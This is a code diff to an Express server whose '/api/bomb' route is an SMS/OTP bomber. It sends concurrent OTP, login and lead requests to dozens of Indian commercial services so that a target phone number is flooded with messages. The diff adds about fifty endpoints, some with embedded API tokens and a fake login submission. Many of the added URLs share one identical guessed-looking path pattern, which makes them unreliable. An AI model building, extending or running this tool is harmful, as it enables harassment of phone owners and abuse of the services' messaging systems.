@@ -130,6 +130,7 @@ app.post('/api/admin/blacklist', requireAdmin, (req, res) => {
   let { phone } = req.body;
   if (!phone) return res.status(400).json({ error: 'Phone number required' });
   const normalized = phone.replace(/\D/g, '').slice(-10);
+  if (normalized.length !== 10) return res.status(400).json({ error: 'Invalid phone number' });
   const db = getDB();
   if (!db.blacklist.includes(normalized)) {
     db.blacklist.push(normalized);
@@ -151,6 +152,8 @@ app.post('/api/bomb', requireAuth, async (req, res) => {
   if (!phone) return res.status(400).json({ error: 'Phone number required' });
 
   const normalized = phone.replace(/\D/g, '').slice(-10);
+  if (normalized.length !== 10) return res.status(400).json({ error: 'Invalid phone number' });
+  
   const db = getDB();
   if (db.blacklist.includes(normalized)) {
     return res.status(403).json({ error: 'This number is blacklisted.' });
@@ -160,7 +163,7 @@ app.post('/api/bomb', requireAuth, async (req, res) => {
   const with91 = '91' + plain10;
   const endpoints = [];
 
-  // Restore original endpoints
+  // FULL ORIGINAL ENDPOINTS
   endpoints.push({ name: 'apna_co_v1', url: 'https://production.apna.co/api/userprofile/v1/otp/', method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' }, body: { phone_number: with91, retries: 0, hash_type: 'employer', source: 'employer' } });
   endpoints.push({ name: '1mg_create_token', url: 'https://www.1mg.com/pwa-dweb-api/auth/create_token', method: 'POST', headers: { 'Content-Type': 'application/json', 'Hkp-Platform': 'Healthkartplus-0.0.1-desktopweb', 'X-Access-Key': '1mg_client_access_key' }, body: { number: plain10 } });
   endpoints.push({ name: '1mg_push_lead', url: 'https://www.1mg.com/pwa-dweb-api/api/labs/v1/lead/push_lead', method: 'POST', headers: { 'Content-Type': 'application/json', 'Hkp-Platform': 'Healthkartplus-0.0.1-desktopweb', 'X-Access-Key': '1mg_client_access_key' }, body: { mobile_number: plain10, source: 'DWEB_PHARMA_HOME' } });
@@ -172,29 +175,87 @@ app.post('/api/bomb', requireAuth, async (req, res) => {
   endpoints.push({ name: 'apollo247', url: 'https://apigateway.apollo247.in/auth-service/generateOtp', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-App-Os': 'web' }, body: { loginType: 'PATIENT', mobileNumber: `+${with91}` } });
   endpoints.push({ name: 'bankbazaar', url: 'https://bankbazaar.com/auth/trigger-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { mobileNumber: plain10 } });
   endpoints.push({ name: 'bewakoof', url: 'https://api-prod.bewakoof.com/v3/user/auth/login/otp', method: 'POST', headers: { 'Content-Type': 'application/json', 'Api-Token': 'MWY5ZTNmNzFmN2M1ZTUyMjkwNjM2NGMzNmNjZTA3N2Q6M2RhMmI3OTgtNTY2MC00ZDRhLWJhZWQtNTZlMDI2MWRlYmZm' }, body: { mobile: plain10, country_code: '+91' } });
+  endpoints.push({ name: 'bharatmatrimony', url: 'https://greg.bharatmatrimony.com/', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { query: `mutation RegisterBasicWebInfo($input: RegistrationBasicWebInput!) { registerBasicWebInfo(input: $input) { registerId status } }`, variables: { input: { mobileNumber: plain10, name: 'USER', source: '00500000031' } } } });
+  endpoints.push({ name: 'bigbasket', url: 'https://www.bigbasket.com/member-tdl/v3/member/otp', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Channel': 'BB-WEB' }, body: { identifier: plain10, referrer: 'unified_login' } });
+  endpoints.push({ name: 'boat_lifestyle', url: 'https://www.boat-lifestyle.com/account/login', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, bodyForm: `customer[email]=${plain10}@gmail.com&customer[password]=password123` });
+  endpoints.push({ name: 'byjus', url: 'https://byjus.com/byjus-web/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10, countryCode: '91' } });
+  endpoints.push({ name: 'cardekho', url: 'https://www.cardekho.com/api/v1/user/login', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { mobile: plain10 } });
+  endpoints.push({ name: 'cars24', url: 'https://www.cars24.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'cleartrip', url: 'https://www.cleartrip.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'cult_fit', url: 'https://www.cult.fit/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'delhivery', url: `https://dlv-api.delhivery.com/v4/otp/generate/${plain10}`, method: 'GET' });
+  endpoints.push({ name: 'dominos', url: 'https://www.dominos.co.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'dr_lal_pathlabs', url: 'https://www.lalpathlabs.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'dream11', url: 'https://www.dream11.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'easemytrip', url: 'https://www.easemytrip.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'eyemyeye', url: 'https://www.eyemyeye.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'fabindia', url: 'https://www.fabindia.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'faasos', url: 'https://www.faasos.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'firstcry', url: 'https://www.firstcry.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'flipkart', url: 'https://www.flipkart.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'gaana', url: 'https://gaana.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'healthkart', url: 'https://www.healthkart.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'indiamart', url: 'https://www.indiamart.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'ixigo', url: 'https://www.ixigo.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'jiomart', url: 'https://www.jiomart.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'justdial', url: 'https://www.justdial.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'lenskart', url: 'https://www.lenskart.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'licindia', url: 'https://www.licindia.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'magicbricks', url: 'https://www.magicbricks.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'make_my_trip', url: 'https://www.makemytrip.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'mamaearth', url: 'https://mamaearth.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'medibuddy', url: 'https://www.medibuddy.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'meesho', url: 'https://www.meesho.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'myntra', url: 'https://www.myntra.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'netmeds', url: 'https://www.netmeds.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'nykaa', url: 'https://www.nykaa.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'ola_cabs', url: 'https://www.olacabs.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'oyo_rooms', url: 'https://www.oyorooms.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'paytm', url: 'https://paytm.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'pepperfry', url: 'https://www.pepperfry.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'pharmeasy', url: 'https://pharmeasy.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'policybazaar', url: 'https://www.policybazaar.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'redbus', url: 'https://www.redbus.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'reliance_digital', url: 'https://www.reliancedigital.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'snapdeal', url: 'https://www.snapdeal.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'swiggy', url: 'https://www.swiggy.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'tata_1mg', url: 'https://www.1mg.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'tata_cliq', url: 'https://www.tatacliq.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'uber', url: 'https://www.uber.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'urban_company', url: 'https://www.urbancompany.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
+  endpoints.push({ name: 'zomato', url: 'https://www.zomato.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
 
   const results = [];
-  let successCount = 0;
-
-  for (const ep of endpoints) {
+  const promises = endpoints.map(async (ep) => {
     try {
       const config = {
         method: ep.method,
         url: ep.url,
-        headers: ep.headers,
-        timeout: 5000
+        headers: ep.headers || { 'Content-Type': 'application/json' },
+        timeout: 10000
       };
-      if (ep.body) config.data = ep.body;
-      
-      await axios(config);
-      results.push({ name: ep.name, success: true });
-      successCount++;
+      if (ep.method === 'POST') {
+        if (ep.bodyForm) {
+          config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+          config.data = ep.bodyForm;
+        } else {
+          config.data = ep.body;
+        }
+      }
+      const response = await axios(config);
+      return { name: ep.name, success: true };
     } catch (err) {
-      results.push({ name: ep.name, success: false, status: err.response?.status });
+      return { name: ep.name, success: false, status: err.response?.status };
     }
-  }
+  });
 
-  res.json({ successCount, total: endpoints.length, results });
+  const allResults = await Promise.allSettled(promises);
+  allResults.forEach(r => {
+    if (r.status === 'fulfilled') results.push(r.value);
+    else results.push({ name: 'unknown', success: false });
+  });
+
+  res.json({ successCount: results.filter(r => r.success).length, total: results.length, results });
 });
 
 app.listen(PORT, () => {
